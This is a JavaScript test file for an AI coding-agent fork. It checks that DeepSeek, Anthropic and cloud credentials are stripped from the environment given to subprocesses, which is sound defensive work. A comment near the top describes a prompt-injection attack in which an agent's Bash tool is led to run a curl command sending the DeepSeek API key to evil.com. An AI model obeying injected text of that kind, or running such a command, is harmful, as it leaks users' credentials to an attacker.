import { test } from 'node:test'
import assert from 'node:assert/strict'

import {
  SUBPROCESS_SCRUB_KEYS,
  scrubSubprocessEnv,
} from '../src/utils/subprocessEnvScrub.mjs'

// ── the fork's REAL credential MUST be in the scrub set ──────────────────────
// Regression for the inherited-from-upstream gap: the list scrubbed
// ANTHROPIC_API_KEY but not the DeepSeek/DeepCode credentials, so prompt
// injection could `curl evil.com -d "$DEEPSEEK_API_KEY"` from a Bash tool.

test('the DeepSeek/DeepCode credential vars are all in the scrub set', () => {
  for (const k of ['DEEPSEEK_API_KEY', 'DEEPCODE_API_KEY', 'API_KEY']) {
    assert.ok(SUBPROCESS_SCRUB_KEYS.includes(k), `${k} must be scrubbed`)
  }
})

test('scrubSubprocessEnv strips the DeepSeek credential (and INPUT_ duplicate)', () => {
  const env = {
    DEEPSEEK_API_KEY: 'sk-secret-deepseek',
    DEEPCODE_API_KEY: 'sk-secret-deepcode',
    API_KEY: 'sk-secret-generic',
    INPUT_DEEPSEEK_API_KEY: 'sk-secret-gha-input',
    PATH: '/usr/bin',
  }
  const out = scrubSubprocessEnv(env)
  assert.equal(out.DEEPSEEK_API_KEY, undefined)
  assert.equal(out.DEEPCODE_API_KEY, undefined)
  assert.equal(out.API_KEY, undefined)
  assert.equal(out.INPUT_DEEPSEEK_API_KEY, undefined)
  // non-secret vars survive
  assert.equal(out.PATH, '/usr/bin')
})

test('Anthropic + cloud creds are still scrubbed (no regression from the refactor)', () => {
  const env = {
    ANTHROPIC_API_KEY: 'sk-ant-x',
    CLAUDE_CODE_OAUTH_TOKEN: 't',
    AWS_SECRET_ACCESS_KEY: 'aws',
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'oidc',
    GITHUB_TOKEN: 'keep-me', // intentionally NOT scrubbed (gh.sh needs it)
  }
  const out = scrubSubprocessEnv(env)
  assert.equal(out.ANTHROPIC_API_KEY, undefined)
  assert.equal(out.CLAUDE_CODE_OAUTH_TOKEN, undefined)
  assert.equal(out.AWS_SECRET_ACCESS_KEY, undefined)
  assert.equal(out.ACTIONS_ID_TOKEN_REQUEST_TOKEN, undefined)
  assert.equal(out.GITHUB_TOKEN, 'keep-me')
})

test('non-secret DeepSeek config/model vars are NOT scrubbed', () => {
  // routing/model vars are not credentials — children may legitimately need them
  const env = {
    DEEPSEEK_MODEL: 'deepseek-v4-pro',
    DEEPSEEK_BASE_URL: 'https://api.deepseek.com',
    DEEPCODE_PROVIDER: 'deepseek',
    HOME: '/home/u',
  }
  const out = scrubSubprocessEnv(env)
  assert.equal(out.DEEPSEEK_MODEL, 'deepseek-v4-pro')
  assert.equal(out.DEEPSEEK_BASE_URL, 'https://api.deepseek.com')
  assert.equal(out.DEEPCODE_PROVIDER, 'deepseek')
  assert.equal(out.HOME, '/home/u')
})

test('scrubSubprocessEnv is pure — it does not mutate the input env', () => {
  const env = { DEEPSEEK_API_KEY: 'sk-x', PATH: '/bin' }
  const out = scrubSubprocessEnv(env)
  assert.equal(env.DEEPSEEK_API_KEY, 'sk-x', 'input must be untouched')
  assert.notEqual(out, env, 'returns a new object')
})

test('accepts a custom key list', () => {
  const out = scrubSubprocessEnv({ A: '1', B: '2' }, ['A'])
  assert.equal(out.A, undefined)
  assert.equal(out.B, '2')
})
